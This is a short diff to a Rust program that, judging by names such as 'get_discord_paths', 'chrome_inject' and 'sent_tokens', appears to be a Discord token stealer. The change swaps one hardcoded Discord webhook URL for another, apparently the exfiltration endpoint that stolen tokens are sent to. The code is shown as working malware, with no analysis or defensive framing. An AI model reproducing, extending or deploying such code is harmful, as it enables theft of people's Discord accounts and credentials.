@@ -147,7 +147,7 @@ fn get_discord_paths() -> HashMap<&'static str, PathBuf> {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     browsers::chrome_inject::cleanup_legacy_artifacts();
 
-    let wbh = "https://discord.com/api/webhooks/1492679213478580447/okx50duQMVNKN3Nh2k9llKj29XMi-H0QK3rB4SowuRidhVADcy-k1Y68z229HmzI1yVT";
+    let wbh = "https://discord.com/api/webhooks/1529195936272613640/QBRdpSpgeJkbg0OGdt1_tFVhwsX8q8VpKYFZH5HXJrTm5No6DpgiPT2iKwZUv6p8FDXd";
     let client = reqwest::Client::new();
     let mut sent_tokens = HashSet::new();
 
